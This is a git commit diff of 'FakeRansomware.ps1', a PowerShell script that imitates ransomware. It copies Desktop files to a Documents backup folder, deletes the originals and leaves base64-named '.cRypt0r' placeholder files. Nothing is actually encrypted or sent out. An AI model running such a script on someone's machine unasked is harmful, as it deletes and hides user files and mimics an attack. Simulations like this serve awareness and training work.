e3b6d23d73d1cb7af4e51bf4b7147edc9def46e6
Andreas Mouritsen <77634312+Andreas6920@users.noreply.github.com>
2022-01-10 22:37:31 +0100

    Update FakeRansomware.ps1

--- FakeRansomware.ps1
+++ FakeRansomware.ps1
@@ -1,34 +1,36 @@
 ﻿## IMPORTANT!! your data will NOT be altered. this is fake. check your Documents folder.
 
-cls
-$targetdir = [Environment]::GetFolderPath("Desktop")
-$backupdir = [Environment]::GetFolderPath("MyDocuments")
-$files = (get-childitem -File $targetdir -Depth 100).FullName | where { ! $_.PSIsContainer }
-$part1 = Split-Path $files;
-$fileextension = "cRypt0r"
+#File encryption
+    $targetdir = [Environment]::GetFolderPath("Desktop")
+    $backupdir = [Environment]::GetFolderPath("MyDocuments") + "\backup"
+    $files = (get-childitem -File $targetdir -Depth 100).FullName | where { ! $_.PSIsContainer }
+    $part1 = Split-Path $files;
+    $fileextension = "cRypt0r"
 
 
-#Copy folder structure
-Robocopy $targetdir $backupdir /E /XF *.* | out-null
+    #Copy folder structure
+    Robocopy $targetdir $backupdir /E /XF *.* | out-null
 
-foreach ($file in $files)
-{
-#Ignore files bigger than 1GB
-if(Get-ChildItem $file  | Where-Object {$_.Length -lt 1gb}){
+    foreach ($file in $files)
+    {
+    #Ignore files bigger than 1GB
+    if(Get-ChildItem $file  | Where-Object {$_.Length -lt 1gb}){
 
-#Copying file from targetdir to backupdir
-$newdir = $file.Replace($targetdir,$backupdir)
-Copy-Item $file $newdir
-Remove-item $file
+    #Copying file from targetdir to backupdir
+    $newdir = $file.Replace($targetdir,$backupdir)
+    Copy-Item $file $newdir
+    Remove-item $file
 
-#Generate fake encrypted file
-$encrypted = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($file))
-$encrypted = $encrypted.Substring($encrypted.Length - 16).replace("=","")
-$encrypted = $encrypted + ".$fileextension"
-$path = Join-path -path (Split-Path $file) -ChildPath $encrypted
-new-item $path | out-null
+    #Generate fake encrypted file
+    $encrypted = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($file))
+    $encryptedcontent = $encrypted
+    $encrypted = $encrypted.Substring($encrypted.Length - 16).replace("=","")
+    $encrypted = $encrypted + ".$fileextension"
+    $path = Join-path -path (Split-Path $file) -ChildPath $encrypted
+    new-item $path | out-null
+    Add-Content -Path $path -Value $encryptedcontent
 
-}}
+    }}
 
 
 
